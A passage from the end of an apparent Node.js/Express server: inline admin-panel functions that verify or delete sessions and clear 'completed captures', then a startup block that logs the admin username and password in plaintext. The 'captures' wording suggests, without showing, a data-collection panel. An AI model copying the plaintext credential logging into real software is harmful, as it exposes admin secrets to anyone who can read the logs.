function markVerif(sid){fetch('/admin-mark-verified',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid})}).then(function(r){return r.json();}).then(function(d){if(d.success){showToast('Marked as verified');location.reload();}else{showToast('Failed');}});}
function delSession(sid){if(!confirm('Delete this session?'))return;fetch('/admin-delete-session',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid})}).then(function(r){return r.json();}).then(function(d){if(d.success){showToast('Session deleted');location.reload();}else{showToast('Failed');}});}
function clearActive(){if(!confirm('Delete all active sessions?'))return;fetch('/admin-clear-active',{method:'POST',headers:{'Content-Type':'application/json'}}).then(function(r){return r.json();}).then(function(d){if(d.success){showToast('Active sessions cleared');location.reload();}else{showToast('Failed');}});}
function clearCompleted(){if(!confirm('Delete all completed captures?'))return;fetch('/admin-clear-completed',{method:'POST',headers:{'Content-Type':'application/json'}}).then(function(r){return r.json();}).then(function(d){if(d.success){showToast('Completed captures cleared');location.reload();}else{showToast('Failed');}});}
function clearAll(){if(!confirm('Delete ALL data? This cannot be undone!'))return;fetch('/admin-clear-all',{method:'POST',headers:{'Content-Type':'application/json'}}).then(function(r){return r.json();}).then(function(d){if(d.success){showToast('All data cleared');location.reload();}else{showToast('Failed');}});}
</script>
</body></html>`);
}

// ─── START ──────────────────────────────────

app.listen(PORT, '0.0.0.0', () => {
  console.log('Running on port ' + PORT);
  console.log('Admin panel: http://localhost:' + PORT + '/' + ADMIN_PATH);
  console.log('Admin user: ' + ADMIN_USERNAME);
  console.log('Admin pass: ' + ADMIN_PASSWORD);
});